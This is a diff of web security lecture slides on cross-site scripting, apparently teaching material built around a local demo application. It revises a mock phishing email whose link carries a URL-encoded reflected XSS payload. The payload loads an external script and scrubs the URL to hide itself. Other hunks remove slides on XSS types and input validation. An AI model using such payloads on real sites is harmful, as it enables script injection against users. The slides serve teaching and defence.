@@ -42,7 +42,7 @@ Web applications vulnerable to XSS...
 You won our big lottery which you might not even have participated in!
 Click on the following totall inconspicious link to claim your prize **now**!
 
-[CLICK HER! FREE STUFF! YOU WON!](http://localhost:3000/#/search?q=%3Cimg+src%3Dx+onerror%3D%27var+js%3Ddocument.createElement%28%22script%22%29%3Bjs.type+%3D+%22text%2Fjavascript%22%3Bjs.src%3D%22http%3A%2F%2Flocalhost%3A8080%2Fshake.js%22%3Bdocument.body.appendChild%28js%29%3Bvar+hash%3Dwindow.location.hash%3Bwindow.location.hash%3Dhash.substr%280%2C8%29%3B%27%2F%3Eapple)
+[CLICK HER! FREE STUFF! YOU WON!](http://localhost:3000/#/search?q=%3Cimg%20src%3D%22bha%22%20onError%3D%27javascript%3Aeval%28%60var%20js%3Ddocument.createElement%28%22script%22%29%3Bjs.type%3D%22text%2Fjavascript%22%3Bjs.src%3D%22http%3A%2F%2Flocalhost%3A8080%2Fshake.js%22%3Bdocument.body.appendChild%28js%29%3Bvar%20hash%3Dwindow.location.hash%3Bwindow.location.hash%3D%22%23%2Fsearch%3Fq%3Dapple%22%3BsearchQuery.value%20%3D%20%22apple%22%3B%60%29%27%3C%2Fimg%3Eapple)
 
 Sincereely yours,
 
@@ -166,30 +166,6 @@ _:information_source: The previous example vulnerability and exploit of `results
 
 ---
 
-<!-- *footer: Монгол: Reflected XSS, 2016 Nurmukhamyed, used under CC-BY-SA 4.0 -->
-
-# Reflected XSS
-
-![Монгол: Reflected XSS, 2016 Nurmukhamyed, used under CC-BY-SA 4.0](images/02-02-xss/reflected-xss.png)
-
----
-
-<!-- *footer: Монгол: Stored XSS, 2016 Nurmukhamyed, used under CC-BY-SA 4.0 -->
-
-# Stored XSS
-
-![Монгол: Stored XSS, 2016 Nurmukhamyed, used under CC-BY-SA 4.0](images/02-02-xss/stored-xss.png)
-
----
-
-<!-- *footer: Монгол: DOM-based XSS, 2016 Nurmukhamyed, used under CC-BY-SA 4.0 -->
-
-# DOM XSS
-
-![Монгол: DOM-based XSS, 2016 Nurmukhamyed, used under CC-BY-SA 4.0](images/02-02-xss/dom-xss.png)
-
----
-
 # [Prevention](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
 
 * **Do not include user supplied input in your output!** :100:
@@ -242,35 +218,6 @@ private String sanitizeHtml(String html) {
   return policy.sanitize(html);
 }
 ```
-
----
-
-# Input Validation
-
-## Black List
-* **"Allow what is not explicitly blocked!"**
-  * Example: Do not allow `<`, `>`, `"`, `;`, `'` and `script` in user input (:interrobang:)
-
-<!-- -->
-
-* Can be bypassed by masking attack patterns
-* Must be updated for new attack patterns
-
-**= Negative Security Rule**
-
----
-
-## White List
-* **"Block what is not explicitly allowed!"**
-  * Example: Allow only `a-z`, `A-Z` and `0-9` in user input
-
-<!-- -->
-
-* Provide protection even against future vulnerabilities
-* Tend to get weaker over time when not carefully maintained
-* Can be quite effortsome to define for a whole application
-
-**= Positive Security Rule**
 
 ---
 
